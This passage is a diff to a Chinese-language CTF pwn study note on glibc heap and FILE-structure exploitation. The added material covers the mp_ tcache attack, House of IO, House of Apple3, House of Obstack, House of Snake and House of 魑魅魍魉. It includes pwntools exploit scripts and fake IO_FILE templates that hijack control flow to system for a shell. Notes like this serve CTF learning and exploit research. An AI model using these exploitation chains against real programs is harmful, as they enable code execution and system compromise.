@@ -819,6 +819,9 @@ readelf -S xxx # 节表
 readelf -l a.out # 程序头表/段表 整理节表组成内存页, 且按权限分了类, 可以看到未运行文件大小和运行后内存大小
 readelf -r a.out # 重定位表
 readelf -s a.out # 符号表 主要链接和调试中使用, strip elf命令去掉后IDA分析只能分析出sub_XXXX
+
+readelf -S  vuln  | grep debug #查看是否有调试信息
+readelf -s vuln #查看是否去除符号表   
 ```
 
 **objdump**
@@ -917,7 +920,7 @@ md5sum ./libc-xx.so
 **libc-database**中libc和ld带符号信息，但没有glibc-all-in-one中配置的debug，即在gdb调试时无法显示符号信息，需要手动下载：
 
 ```bash
-dpkg-deb -x libcx-dbg_x.xx-xubuntux.x_amd64.deb ./sym
+dpkg-deb -x libc6-dbg_x.xx-xubuntux.x_amd64.deb ./sym
 cp ~/sym/usr/lib/debug/lib/x86_64-linux-gnu/ xxxx/.debug/ # 其中file libc和ld会带有with debug_info, not stripped信息
 # 最终在gdb中set debug-file-directory xxxx/.debug/
 ```
@@ -931,9 +934,14 @@ cp ~/sym/usr/lib/debug/lib/x86_64-linux-gnu/ xxxx/.debug/ # 其中file libc和ld
 【旧版本】
 
 - gdb10.1版本支持debuginfod，且elfutils-0.179后才支持，编译gdb configure加入`--with-debuginfod`
-
 - `vim /etc/debuginfod/ubuntu.urls`写入`https://debuginfod.ubuntu.com`
 - pwndbg中在`~/.gdbinit`写入`set debuginfod enabled on`
+
+```bash
+export DEBUGINFOD_URLS=https://debuginfod.deepin.com
+```
+
+
 
 ## 基础知识
 
@@ -5194,7 +5202,7 @@ typedef struct tcache_entry
 ```C
 typedef struct tcache_perthread_struct
 {
-  char counts[TCACHE_MAX_BINS];
+  char counts[TCACHE_MAX_BINS]; // 1字节
   tcache_entry *entries[TCACHE_MAX_BINS];
 } tcache_perthread_struct;
 
@@ -5984,6 +5992,36 @@ next = ((heap_addr >> 12) % (2**64)) ^ free_hook_addr
 - 覆盖`fd`为与`__free_hook`地址异或后的`next`地址，申请2个同样大小堆块，第二块为fd指向的`__free_hook`地址
 - 写入`system`地址，调用`free()`包含`'/bin/sh'`的堆块达成getshell
 
+#### mp_ attack
+
+- glibc-2.31，通过`large bin attack`修改`mp_.tcach_bins`为极大值/堆地址
+- 该值记录tcache bin的最大索引值，超过该值的堆块都不属于tcache bin
+
+**利用**
+
+- 修改`tcache_bins`后删除0x500大小的chunk z时，会进入到tcache中，且此时tcache的结构体会和堆重叠
+
+- 实际过程可通过gdb调试获取【1】增加的counts值以及【2】何处地址值更改为了e
+
+```c
+// tcache_put 函数
+tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
+e->key = tcache;
+e->next = tcache->entries[tc_idx];
+tcache->entries[tc_idx] = e; // 【2】
+++(tcache->counts[tc_idx]); // 【1】
+```
+
+此时chunk z的bk指向`heap_base_addr + 0x10`处，且由于tcache->counts+1，gdb观察时会出现tcache为0x0001000情况，通过【2】找到可控chunk x，gdb呈现：
+
+```bash
+chunk x_addr --> 0
+...
+chunk x_addr + offset --> chunk z_addr
+```
+
+修改可控`chunk x_addr + offset`为`__free_hook`地址，申请0x500大小chunk时tcache将申请出`__free_hook`地址，修改为`system`，free带有`/bin/sh`的chunk达成利用
+
 ### Large bin attack
 
 #### 地址泄露
@@ -6075,7 +6113,7 @@ malloc(4, 0x500) # 由于0x400无法满足0x500，chunk0进入large bin
 
 edit(4, p64(0) + p64(libc.sym["stderr"]-0x10) + p64(0) + p64(libc.sym['_IO_list_all']-0x20)) # UAF伪造
 free(2) # chunk2进入unsorted bin
-malloc(5, 0x500) # chunk2进入large bin 触发两处任意地址写，将stderr和_IO_list_all改为堆地址
+malloc(5, 0x500) # chunk2进入large bin 触发两处任意地址写，将stderr和_IO_list_all改为chunk2地址
 # glibc-2.31后，只能利用一处，即edit(4, p64(0)*3 + p64(target_addr - 0x20))
 ```
 
@@ -6365,6 +6403,10 @@ new(0, 0x200) # target劫持
 ```
 
 <img src="/img/pwn_note.zh-cn.assets/image-20241128190118374.png" alt="image-20241128190118374" style="zoom: 80%;" />
+
+#### House of IO
+
+将`tcache_perthread_struct`结构体释放，再申请回来控制整个tcache分配
 
 #### House of Spirit
 
@@ -8406,7 +8448,72 @@ tcache_max_bytes = mp_ + 88
 
 ![image-20250124161719221](/img/pwn_note.zh-cn.assets/image-20250124161719221.png)
 
+**完整利用**
+
+- 确定构造chunk 1为伪造chunk
+
+  - ```python
+    malloc(0x600)	# 0   	290
+    malloc(0x6e0)	# 1 !   8a0
+    free(0)			# 			 , 0 -> unsorted bin
+    malloc(0x6e0)	# 2  	f90  , chunk 0 into large bin
+    show(0)			# 泄露libc基址, chunk 1地址, _IO_list_all地址, _IO_wfile_jumps地址
+    
+    # 恢复
+    free(1)
+    free(2)
+    ```
+
 - large bin attack劫持`_IO_list_all`为相应large bin chunk，在该large bin chunk伪造
+
+  - 可通过多次构建及释放堆块来劫持`bk_nextsize`
+
+  - 如下使得编辑chunk 4即可修改chunk 6 的`bk_nextsize`以及填入fake IO_FILE结构体
+
+  - ```python
+    malloc(0x5e0) # 3      290
+    malloc(0x800) # 4 !    880
+    free(3) # chunk 3 -> unsorted bin
+    free(4) # chunk 3,4 unlink to topchunk
+    
+    malloc(0x5d0) # 5      290
+    malloc(0x6e0) # 6 !    870
+    malloc(0x500) # 7      f60
+    free(6) # 6 -> unsorted bin
+    malloc(0x800) # 8      1470    6 --> largebin
+    ```
+
+  - 构造fake编辑chunk 4
+
+  - ```python
+    # heap_addr 和 fake 的基地址均为 8a0
+    fake = flat({
+        # 此处实际填入到chunk1中，需要构造使得chunk1的size正确，于是填入0x6e1便于后续free
+        # 加入\x80等是为了字节对齐,也可b'\x80\x80;sh;\x80\x80'
+        0: [b'\x80\x80||sh\x00\x00', 0x6e1], # _flags 
+        0xa0: heap_addr + 0x200, # _wide_data
+        0xd8: _IO_wfile_jumps_addr, # vtable
+        0x2e0: heap_addr + 0x400, # _wide_vtable
+        0x468: system_addr, # doallocate
+        0x6e0: []
+    }, filler = b'\x00')
+    
+    payload = p64(0) + p64(_IO_list_all_addr - 0x20) # 控制chunk 6 bk_nextsize
+    payload += fake # fake IO_FILE struct
+    # 具体调试过程中绕过检查所需操作
+    # if (__glibc_unlikely (!prev_inuse(nextchunk)))
+    #   malloc_printerr ("double free or corruption (!prev)");
+    payload += p64(0) + p64(0x111) + p64(0xd00) + p64(0x6f0)
+    edit(4, payload)
+    ```
+
+  - 释放chunk 1，并触发largebin attack，劫持`_IO_list_all`为chunk 1即8a0结尾地址
+
+  - ```python
+    free(1)
+    malloc(0x800)
+    ```
+
 - exit退出触发
 
 **模板**
@@ -8545,19 +8652,682 @@ void _IO_wdoallocbuf (FILE *fp)
 
 ##### House of Apple3
 
+```c
+- _IO_FILE_complete
+	|- struct _IO_codecvt *_codecvt
+		|-_IO_iconv_t __cd_in
+  		|-_IO_iconv_t __cd_out
+  			|-struct __gconv_step *step
+  				|-struct __gconv_loaded_object *__shlib_handle
+  				|-....
+  				|-__gconv_fct __fct
+  			|-struct __gconv_step_data step_data
+```
 
+- 利用`__libio_codecvt_out`、`__libio_codecvt_in`和`__libio_codecvt_length`函数
+
+① `_IO_wfile_underflow`
+
+**原理**
+
+- `_IO_wfile_underflow`函数中调用了`__libio_codecvt_in`
+- 且其为`_IO_wfile_jumps`这个`_IO_jump_t`类型变量的成员函数
+- 伪造`FILE`结构体的`fp->vtable`为`_IO_wfile_jumps`
+
+**调用链**：`_IO_wfile_underflow` > `__libio_codecvt_in` > `DL_CALL_FCT` > `gs = fp->_codecvt->__cd_in.step` > `*(gs->__fct)(gs)`
+
+**fp设置**
+
+- `_flags`设置为`~(4 | 0x10)`
+- `vtable`设置为`_IO_wfile_jumps`地址（加减偏移），使其能成功调用`_IO_wfile_underflow`即可
+- `fp->_IO_read_ptr < fp->_IO_read_end`，即满足`*(fp + 8) < *(fp + 0x10)`
+- `_wide_data`保持默认，或者设置为堆地址，假设其地址为`A`，即满足`*(fp + 0xa0) = A`
+- `_wide_data->_IO_read_ptr >= _wide_data->_IO_read_end`，即满足`*A >= *(A + 8)`
+- `_codecvt`设置为可控堆地址`B`，即满足`*(fp + 0x98) = B`
+- `codecvt->__cd_in.step`设置为可控堆地址`C`，即满足`*B = C`
+- `codecvt->__cd_in.step->__shlib_handle`设置为`0`，即满足`*C = 0`
+- `codecvt->__cd_in.step->__fct`设置为地址`D`,地址`D`用于控制`rip`，即满足`*(C + 0x28) = D`。当调用到`D`的时候，此时的`rdi`为`C`。如果`_wide_data`也可控的话，`rsi`也能控制
+
+![image-20250126203031787](/img/pwn_note.zh-cn.assets/image-20250126203031787.png)
+
+**模板**
+
+```python
+file_addr = heap_base + 0x6d0
+payload_addr = file_addr + 0x10
+codecvt_addr = file_addr + 0xe0
+frame_addr = codecvt_addr + 5 * 8
+rop_addr = frame_addr + 0xf8
+buf_addr = rop_addr + 0x60
+
+fake_file = b""
+fake_file += p64(0xFFFFFFFFFFFFFFFF)  # _IO_read_end
+fake_file += p64(0)  # _IO_read_base
+fake_file += p64(0)  # _IO_write_base
+fake_file += p64(1)  # _IO_write_ptr
+fake_file += p64(0)  # _IO_write_end
+fake_file += p64(0)  # _IO_buf_base;
+fake_file += p64(0)  # _IO_buf_end should usually be (_IO_buf_base + 1)
+fake_file += p64(0) * 4  # from _IO_save_base to _markers
+fake_file += p64(0)  # the FILE chain ptr
+fake_file += p32(2)  # _fileno for stderr is 2
+fake_file += p32(0)  # _flags2, usually 0
+fake_file += p64(0xFFFFFFFFFFFFFFFF)  # _old_offset, -1
+fake_file += p16(0)  # _cur_column
+fake_file += b"\x00"  # _vtable_offset
+fake_file += b"\n"  # _shortbuf[1]
+fake_file += p32(0)  # padding
+fake_file += p64(libc.sym['_IO_2_1_stdout_'] + 0x1ea0)  # _IO_stdfile_1_lock
+fake_file += p64(0xFFFFFFFFFFFFFFFF)  # _offset, -1
+fake_file += p64(codecvt_addr)  # _codecvt, usually 0
+fake_file += p64(heap_base + 0x1000)  # _IO_wide_data_1
+fake_file += p64(0) * 3  # from _freeres_list to __pad5
+fake_file += p32(0xFFFFFFFF)  # _mode, usually -1
+fake_file += b"\x00" * 19  # _unused2
+fake_file = fake_file.ljust(0xD8 - 0x10, b'\x00')  # adjust to vtable
+fake_file += p64(libc.sym['_IO_wfile_jumps'] + 8)  # fake vtable
+fake_file += p64(frame_addr)
+```
+
+② `_IO_wfile_underflow_mmap`
+
+**利用**
+
+fp设置
+
+- `_flags`设置为`~4`
+- `vtable`设置为`_IO_wfile_jumps_mmap`地址（加减偏移），使其能成功调用`_IO_wfile_underflow_mmap`即可
+- `_IO_read_ptr < _IO_read_end`，即满足`*(fp + 8) < *(fp + 0x10)`
+- `_wide_data`保持默认，或者设置为堆地址，假设其地址为`A`，即满足`*(fp + 0xa0) = A`
+- `_wide_data->_IO_read_ptr >= _wide_data->_IO_read_end`，即满足`*A >= *(A + 8)`
+- `_wide_data->_IO_buf_base`设置为非`0`，即满足`*(A + 0x30) != 0`
+- `_codecvt`设置为可控堆地址`B`，即满足`*(fp + 0x98) = B`
+- `codecvt->__cd_in.step`设置为可控堆地址`C`，即满足`*B = C`
+- `codecvt->__cd_in.step->__shlib_handle`设置为`0`，即满足`*C = 0`
+- `codecvt->__cd_in.step->__fct`设置为地址`D`,地址`D`用于控制`rip`，即满足`*(C + 0x28) = D`。当调用到`D`的时候，此时的`rdi`为`C`。如果`_wide_data`也可控的话，`rsi`也能控制
+
+**调用链**：`_IO_wfile_underflow_mmap` > `__libio_codecvt_in` > `DL_CALL_FCT` > `gs = fp->_codecvt->__cd_in.step` > `*(gs->__fct)(gs)`
+
+③ `_IO_wdo_write`
+
+**原理**
+
+- 满足`fp->_IO_write_ptr > fp->_IO_write_base`
+
+```c
+// _IO_new_file_sync
+if (fp->_IO_write_ptr > fp->_IO_write_base)
+    if (_IO_do_flush(fp)) return EOF;// 调用到此
+```
+
+- `fp->_mode > 0`来调用后者`_IO_wdo_write`
+
+```c
+#define _IO_do_flush(_f)
+  ((_f)->_mode <= 0
+   ? _IO_do_write(_f, (_f)->_IO_write_base,
+          (_f)->_IO_write_ptr-(_f)->_IO_write_base)
+   : _IO_wdo_write(_f, (_f)->_wide_data->_IO_write_base,
+           ((_f)->_wide_data->_IO_write_ptr
+            - (_f)->_wide_data->_IO_write_base)))
+```
+
+- 需要控制`fp->_wide_data`
+
+**利用**
+
+fp设置
+
+- `vtable`设置为`_IO_file_jumps/`地址（加减偏移），使其能成功调用`_IO_new_file_sync`即可
+- `_IO_write_ptr > _IO_write_base`，即满足`*(fp + 0x28) > *(fp + 0x20)`
+- `_mode > 0`，即满足`(fp + 0xc0) > 0`
+- `_IO_write_end != _IO_write_ptr`或者`_IO_write_end == _IO_write_base`，即满足`*(fp + 0x30) != *(fp + 0x28)`或者`*(fp + 0x30) == *(fp + 0x20)`
+- `_wide_data`设置为堆地址，假设地址为`A`，即满足`*(fp + 0xa0) = A`
+- `_wide_data->_IO_write_ptr >= _wide_data->_IO_write_base`，即满足`*(A + 0x20) >= *(A + 0x18)`
+- `_codecvt`设置为可控堆地址`B`，即满足`*(fp + 0x98) = B`
+- `codecvt->__cd_out.step`设置为可控堆地址`C`，即满足`*(B + 0x38) = C`
+- `codecvt->__cd_out.step->__shlib_handle`设置为`0`，即满足`*C = 0`
+- `codecvt->__cd_out.step->__fct`设置为地址`D`,地址`D`用于控制`rip`，即满足`*(C + 0x28) = D`。当调用到`D`的时候，此时的`rdi`为`C`。如果`_wide_data`也可控的话，`rsi`也能控制
+
+**调用链**：`_IO_new_file_sync` > `_IO_do_flush` > `_IO_wdo_write` > `__libio_codecvt_out` > `DL_CALL_FCT` > `gs = fp->_codecvt->__cd_out.step` > `*(gs->__fct)(gs)`
+
+④ `_IO_wfile_sync`
+
+fp设置
+
+- `_flags`设置为`~(4 | 0x10)`
+- `vtable`设置为`_IO_wfile_jumps`地址（加减偏移），使其能成功调用`_IO_wfile_sync`即可
+- `_wide_data`设置为堆地址，假设其地址为`A`，即满足`*(fp + 0xa0) = A`
+- `_wide_data->_IO_write_ptr <= _wide_data->_IO_write_base`，即满足`*(A + 0x20) <= *(A + 0x18)`
+- `_wide_data->_IO_read_ptr != _wide_data->_IO_read_end`，即满足`*A != *(A + 8)`
+- `_codecvt`设置为可控堆地址`B`，即满足`*(fp + 0x98) = B`
+- `codecvt->__cd_in.step`设置为可控堆地址`C`，即满足`*B = C`
+- `codecvt->__cd_in.step->__stateful`设置为非`0`，即满足`*(B + 0x58) != 0`
+- `codecvt->__cd_in.step->__shlib_handle`设置为`0`，即满足`*C = 0`
+- `codecvt->__cd_in.step->__fct`设置为地址`D`,地址`D`用于控制`rip`，即满足`*(C + 0x28) = D`。当调用到`D`的时候，此时的`rdi`为`C`。如果`rsi`为`&codecvt->__cd_in.step_data`可控
+
+**调用链**：`_IO_wfile_sync` > `__libio_codecvt_length` > `DL_CALL_FCT` > `gs = fp->_codecvt->__cd_in.step` > `*(gs->__fct)(gs)`
 
 #### House of Obstack
 
+- <glibc-2.37，利用`_IO_obstack_jumps`，其中`_IO_obstack_overflow`和 `_IO_obstack_xsputn` 都可触发
 
+- **攻击链**
+
+- ```c
+  _IO_obstack_overflow
+          obstack_1grow (obstack, c); // c 不可控
+                  _obstack_newchunk (__o, 1);  
+                           new_chunk = CALL_CHUNKFUN (h, new_size);
+                                       (*(h)->chunkfun)((h)->extra_arg, (size))
+  ```
+
+- ```c
+  _IO_obstack_xsputn
+          obstack_grow (obstack, data, n);;
+                  _obstack_newchunk (__o, __len);
+                           new_chunk = CALL_CHUNKFUN (h, new_size);
+                                       (*(h)->chunkfun)((h)->extra_arg, (size))
+  ```
+
+实际第一条链易触发`assert(c != EOF);`，一般选择第二条链
+
+**原理**
+
+```c
+struct _IO_obstack_file{
+	struct _IO_FILE_plus file;
+	struct obstack *obstack;
+}
+
+struct obstack{
+    // 只列举劫持
+    struct _obstack_chunk *(*chunkfun) (void *, long); // 需要伪造成劫持的地址
+    void *extra_arg; // 参数
+    unsigned use_extra_arg : 1;
+    
+}
+```
+
+**利用**
+
+![image-20250126223346993](/img/pwn_note.zh-cn.assets/image-20250126223346993.png)
 
 #### House of Snake
+
+- glibc-2.37删除了`_IO_obstack_jumps`，增加了`_IO_printf_buffer_as_file_jumps`新`_IO_jumps_t`结构体，其只有`__printf_buffer_as_file_overflow`和`__printf_buffer_as_file_xsputn`2个函数
+- 利用`__printf_buffer_as_file_overflow`
+
+```c
+static const struct _IO_jump_t _IO_printf_buffer_as_file_jumps libio_vtable =
+{
+  JUMP_INIT_DUMMY,
+  JUMP_INIT(finish, NULL),
+  JUMP_INIT(overflow, __printf_buffer_as_file_overflow), // 利用
+  JUMP_INIT(underflow, NULL),
+  JUMP_INIT(uflow, NULL),
+  JUMP_INIT(pbackfail, NULL),
+  JUMP_INIT(xsputn, __printf_buffer_as_file_xsputn),
+  JUMP_INIT(xsgetn, NULL),
+  JUMP_INIT(seekoff, NULL),
+  JUMP_INIT(seekpos, NULL),
+  JUMP_INIT(setbuf, NULL),
+  JUMP_INIT(sync, NULL),
+  JUMP_INIT(doallocate, NULL),
+  JUMP_INIT(read, NULL),
+  JUMP_INIT(write, NULL),
+  JUMP_INIT(seek, NULL),
+  JUMP_INIT(close, NULL),
+  JUMP_INIT(stat, NULL),
+  JUMP_INIT(showmanyc, NULL),
+  JUMP_INIT(imbue, NULL)
+};
+```
+
+**原理**
+
+`__printf_buffer_as_file_overflow`函数
+
+```c
+int __printf_buffer_as_file_overflow (FILE *fp, int ch)
+{
+  // 将 FILE 结构体 fp 转换为 __printf_buffer_as_file 类型
+  struct __printf_buffer_as_file *file = (struct __printf_buffer_as_file *) fp;
+/*
+    struct __printf_buffer_as_file
+    {
+      FILE stream;
+      const struct _IO_jump_t *vtable;
+      
+      struct __printf_buffer *next;
+    };
+    
+    struct __printf_buffer
+    {
+      char *write_base;
+      char *write_ptr;
+      char *write_end;
+      uint64_t written;
+      enum __printf_buffer_mode mode;
+    };
+*/
+
+  __printf_buffer_as_file_commit (file); // 进行了一系列断言检查
+
+  if (ch != EOF)
+    __printf_buffer_putc (file->next, ch);
+  // if判断条件1需要满足: buf->mode != __printf_buffer_mode_failed
+  if (!__printf_buffer_has_failed (file->next) 
+      && file->next->write_ptr == file->next->write_end)
+    __printf_buffer_flush (file->next); // 到此处
+
+  __printf_buffer_as_file_switch_to_buffer (file);
+
+  if (!__printf_buffer_has_failed (file->next))
+    return (unsigned char) ch;
+  else
+    return EOF;
+}
+```
+
+检查绕过
+
+```c
+static void __printf_buffer_as_file_commit (struct __printf_buffer_as_file *file)
+{
+  assert (file->stream._IO_write_ptr >= file->next->write_ptr);
+  assert (file->stream._IO_write_ptr <= file->next->write_end);
+  assert (file->stream._IO_write_base == file->next->write_base);
+  assert (file->stream._IO_write_end == file->next->write_end);
+
+  file->next->write_ptr = file->stream._IO_write_ptr;
+}
+```
+
+进入`__printf_buffer_flush`
+
+```c
+#define Xprintf(n) __printf_##n
+#define Xprintf_buffer_flush Xprintf (buffer_flush)
+#define Xprintf_buffer Xprintf (buffer)
+
+bool Xprintf_buffer_flush (struct Xprintf_buffer *buf)
+{
+  if (__glibc_unlikely (Xprintf_buffer_has_failed (buf)))
+    return false;
+ 
+  Xprintf (buffer_do_flush) (buf); // 此处调用__printf_buffer_do_flush(buf)
+  ...
+}
+```
+
+`__printf_buffer_do_flush`
+
+```c
+static void __printf_buffer_do_flush (struct __printf_buffer *buf)
+{
+  switch (buf->mode)
+    {
+    case __printf_buffer_mode_failed:
+    case __printf_buffer_mode_sprintf:
+      return;
+    case __printf_buffer_mode_snprintf:
+      __printf_buffer_flush_snprintf ((struct __printf_buffer_snprintf *) buf);
+      return;
+    case __printf_buffer_mode_sprintf_chk:
+      __chk_fail ();
+      break;
+    case __printf_buffer_mode_to_file:
+      __printf_buffer_flush_to_file ((struct __printf_buffer_to_file *) buf);
+      return;
+    case __printf_buffer_mode_asprintf:
+      __printf_buffer_flush_asprintf ((struct __printf_buffer_asprintf *) buf);
+      return;
+    case __printf_buffer_mode_dprintf:
+      __printf_buffer_flush_dprintf ((struct __printf_buffer_dprintf *) buf);
+      return;
+    case __printf_buffer_mode_strfmon:
+      __set_errno (E2BIG);
+      __printf_buffer_mark_failed (buf);
+      return;
+    case __printf_buffer_mode_fp:
+      __printf_buffer_flush_fp ((struct __printf_buffer_fp *) buf);
+      return;
+    case __printf_buffer_mode_fp_to_wide:
+      __printf_buffer_flush_fp_to_wide
+        ((struct __printf_buffer_fp_to_wide *) buf);
+      return;
+    case __printf_buffer_mode_fphex_to_wide:
+      __printf_buffer_flush_fphex_to_wide
+        ((struct __printf_buffer_fphex_to_wide *) buf);
+      return;
+    case __printf_buffer_mode_obstack: // 进入该 case
+      __printf_buffer_flush_obstack ((struct __printf_buffer_obstack *) buf);
+      return;
+    }
+  __builtin_trap ();
+}
+```
+
+调用`__printf_buffer_flush_obstack`
+
+```c
+void __printf_buffer_flush_obstack (struct __printf_buffer_obstack *buf)
+{
+  buf->base.written += buf->base.write_ptr - buf->base.write_base;
+  if (buf->base.write_ptr == &buf->ch + 1)
+    {
+      obstack_1grow (buf->obstack, buf->ch); // 调用该函数
+      // 后续IO利用调用链为
+      // _obstack_newchunk (__o, 1);  
+			// new_chunk = CALL_CHUNKFUN (h, new_size);
+				// (*(h)->chunkfun)((h)->extra_arg, (size)) 
+```
+
+**利用**
+
+![image-20250127213018398](/img/pwn_note.zh-cn.assets/image-20250127213018398.png)
 
 
 
 #### House of 魑魅魍魉
 
+- <glibc-2.37 
+- `_IO_helper_jumps` ，根据COMPILE_WPRINTF不同而生成不同的跳转表，实际程序中有2个表
+- `COMPILE_WPRINTF == 0` 先生成，`COMPILE_WPRINTF == 1` 后生成
 
+```c
+#ifdef COMPILE_WPRINTF
+static const struct _IO_jump_t _IO_helper_jumps libio_vtable =
+{
+  JUMP_INIT_DUMMY,
+  JUMP_INIT (finish, _IO_wdefault_finish),
+  JUMP_INIT (overflow, _IO_helper_overflow),
+  JUMP_INIT (underflow, _IO_default_underflow),
+  JUMP_INIT (uflow, _IO_default_uflow),
+  JUMP_INIT (pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),
+  JUMP_INIT (xsputn, _IO_wdefault_xsputn),
+  JUMP_INIT (xsgetn, _IO_wdefault_xsgetn),
+  JUMP_INIT (seekoff, _IO_default_seekoff),
+  JUMP_INIT (seekpos, _IO_default_seekpos),
+  JUMP_INIT (setbuf, _IO_default_setbuf),
+  JUMP_INIT (sync, _IO_default_sync),
+  JUMP_INIT (doallocate, _IO_wdefault_doallocate),
+  JUMP_INIT (read, _IO_default_read),
+  JUMP_INIT (write, _IO_default_write),
+  JUMP_INIT (seek, _IO_default_seek),
+  JUMP_INIT (close, _IO_default_close),
+  JUMP_INIT (stat, _IO_default_stat)
+};
+#else
+static const struct _IO_jump_t _IO_helper_jumps libio_vtable =
+{
+  JUMP_INIT_DUMMY,
+  JUMP_INIT (finish, _IO_default_finish),
+  JUMP_INIT (overflow, _IO_helper_overflow),
+  JUMP_INIT (underflow, _IO_default_underflow),
+  JUMP_INIT (uflow, _IO_default_uflow),
+  JUMP_INIT (pbackfail, _IO_default_pbackfail),
+  JUMP_INIT (xsputn, _IO_default_xsputn),
+  JUMP_INIT (xsgetn, _IO_default_xsgetn),
+  JUMP_INIT (seekoff, _IO_default_seekoff),
+  JUMP_INIT (seekpos, _IO_default_seekpos),
+  JUMP_INIT (setbuf, _IO_default_setbuf),
+  JUMP_INIT (sync, _IO_default_sync),
+  JUMP_INIT (doallocate, _IO_default_doallocate),
+  JUMP_INIT (read, _IO_default_read),
+  JUMP_INIT (write, _IO_default_write),
+  JUMP_INIT (seek, _IO_default_seek),
+  JUMP_INIT (close, _IO_default_close),
+  JUMP_INIT (stat, _IO_default_stat)
+};
+#endif
+```
+
+不同 `COMPILE_WPRINTF` 对应 `helper_file` 也不同，区别在于是否需要伪造 `struct _IO_wide_data _wide_data;`
+
+```c
+struct helper_file
+{
+	struct _IO_FILE_plus _f;
+#ifdef COMPILE_WPRINTF
+	struct _IO_wide_data _wide_data;
+#endif
+	FILE *_put_stream;
+#ifdef _IO_MTSAFE_IO
+	_IO_lock_t lock;
+#endif
+};
+```
+
+**原理**
+
+- 利用 `COMPILE_WPRINTF == 1` 的 `_IO_helper_overflow` ，攻击过程中该函数用于控制 `_IO_default_xsputn` 的三个参数
+
+```c
+static int _IO_helper_overflow (FILE *s, int c)
+{
+  FILE *target = ((struct helper_file*) s)->_put_stream; // 第一个参数
+#ifdef COMPILE_WPRINTF
+  // 第三个参数
+  int used = s->_wide_data->_IO_write_ptr - s->_wide_data->_IO_write_base; 
+  if (used)
+    {
+      // 利用这个链，三个参数都可控
+      size_t written = _IO_sputn (target, s->_wide_data->_IO_write_base, used);
+      if (written == 0 || written == WEOF)
+    return WEOF;
+      __wmemmove (s->_wide_data->_IO_write_base,
+          s->_wide_data->_IO_write_base + written,
+          used - written);
+      s->_wide_data->_IO_write_ptr -= written;
+    }
+#else
+    // 如果使用这条链，_IO_write_ptr 将处于 largebin 的 bk_size 指针处
+  int used = s->_IO_write_ptr - s->_IO_write_base;
+  if (used)
+    {
+      size_t written = _IO_sputn (target, s->_IO_write_base, used);
+      if (written == 0 || written == EOF)
+    return EOF;
+      memmove (s->_IO_write_base, s->_IO_write_base + written,
+           used - written);
+      s->_IO_write_ptr -= written;
+    }
+#endif
+  return PUTC (c, s);
+}
+```
+
+- 修改 `((struct helper_file*) s)->_put_stream` 的 `vtable` 指向 `_IO_str_jumps` ，使其调用 `_IO_default_xsputn` 函数
+- `_IO_default_xsputn` 函数内要绕过的内容较多，其攻击过程中两次调用 `__mempcpy` ：
+  - 第一次利用任意地址写修改 `__mempcpy` 对应的 got 表中的值
+  - 第二次调用 `__mempcpy` 劫持程序执行流
+
+```c
+size_t _IO_default_xsputn (FILE *f, const void *data, size_t n)
+{
+  const char *s = (char *) data;
+  size_t more = n;
+  if (more <= 0)
+    return 0;
+  for (;;)
+    {
+      /* Space available. */
+      if (f->_IO_write_ptr < f->_IO_write_end)
+    {
+      size_t count = f->_IO_write_end - f->_IO_write_ptr;
+          // 要 more > count，能再次返回执行 __mempcpy
+      if (count > more)
+        count = more;
+          // 要 count > 20
+      if (count > 20)
+        {
+          // 利用此处实现 house of 借刀杀人，
+          // 修改 memcpy 的内容为setcontext
+          // 再次返回的时候就能够实现 house of 一骑当千
+          f->_IO_write_ptr = __mempcpy (f->_IO_write_ptr, s, count);
+          s += count;
+        }
+      else if (count)
+        {
+          char *p = f->_IO_write_ptr;
+          ssize_t i;
+          for (i = count; --i >= 0; )
+        *p++ = *s++;
+          f->_IO_write_ptr = p;
+        }
+          // 要 more > count，能再次返回执行 __mempcpy
+      more -= count;
+    }
+      // 绕过下面这一行，再次执行for循环的内容，_IO_OVERFLOW实际调用_IO_str_overflow
+      if (more == 0 || _IO_OVERFLOW (f, (unsigned char) *s++) == EOF)
+    break;
+      more--;
+    }
+  return n - more;
+}
+libc_hidden_def (_IO_default_xsputn)
+```
+
+**绕过**
+
+- 需要 `more` > `count`，能再次返回执行 `__mempcpy`，且要想再次返回执行 `memcpy`，由于此时 `f->_IO_write_ptr` 被 `_IO_str_overflow` 函数修改为指向 `"/bin/sh"` 字符串，因此 `count = f->_IO_write_end - f->_IO_write_ptr` 可能为一个很大的值，导致 `count > more`，进而更新 `count` 为 `more` ，因此再次循环时要求 `more > 20` 。由于上一次循环中依次执行了 `more -= count` 和 `more--` 语句，因此要求 `more` ≥ `count + 1 + 21` 。
+- 需要 `count` > 20，因此 `count` 至少为 21 。
+- 第一次执行 `__mempcpy (f->_IO_write_ptr, s, count);` 时，
+  - `_IO_write_ptr` 为 `__mempcpy` 表项，
+  - s 为要写入的内容。
+- 再次执行`__mempcpy (f->_IO_write_ptr, s, count);` 时，
+  - 需要绕过 `if (more == 0 || _IO_OVERFLOW (f, (unsigned char) *s++) == EOF)` ，具体绕过方式接下来会介绍。
+  - `f->_IO_write_ptr` 为 `rdi` ，`s` 为 `rsi` ，`count` 为 `rdx` 。
+
+`_IO_str_overflow`作用：控制 `fp->_IO_write_ptr` ，从而控制 `_IO_default_xsputn` 第二次循环中 `__mempcpy` 的第一个参数
+
+```c
+int _IO_str_overflow (FILE *fp, int c)
+{
+  int flush_only = c == EOF;
+  size_t pos;
+  if (fp->_flags & _IO_NO_WRITES)
+      return flush_only ? 0 : EOF;
+    // 需要进入来控制 fp->_IO_write_ptr ， _flags==0x400
+  if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))
+    {
+      fp->_flags |= _IO_CURRENTLY_PUTTING;
+      fp->_IO_write_ptr = fp->_IO_read_ptr; // 控制 fp->_IO_write_ptr 指向 &"/bin/sh" - 1 作为下一次 memcpy(system) 的第一个参数
+      fp->_IO_read_ptr = fp->_IO_read_end;
+    }
+  pos = fp->_IO_write_ptr - fp->_IO_write_base;
+    // 不能进入，要让 _IO_blen (fp)  ((fp)->_IO_buf_end - (fp)->_IO_buf_base) 足够大。
+  if (pos >= (size_t) (_IO_blen (fp) + flush_only))
+    {
+      if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */
+    return EOF;
+      else
+    {
+      char *new_buf;
+      char *old_buf = fp->_IO_buf_base;
+      size_t old_blen = _IO_blen (fp);
+      size_t new_size = 2 * old_blen + 100;
+      if (new_size < old_blen)
+        return EOF;
+      new_buf = malloc (new_size);
+      if (new_buf == NULL)
+        {
+          /*      __ferror(fp) = 1; */
+          return EOF;
+        }
+      if (old_buf)
+        {
+          memcpy (new_buf, old_buf, old_blen);
+          free (old_buf);
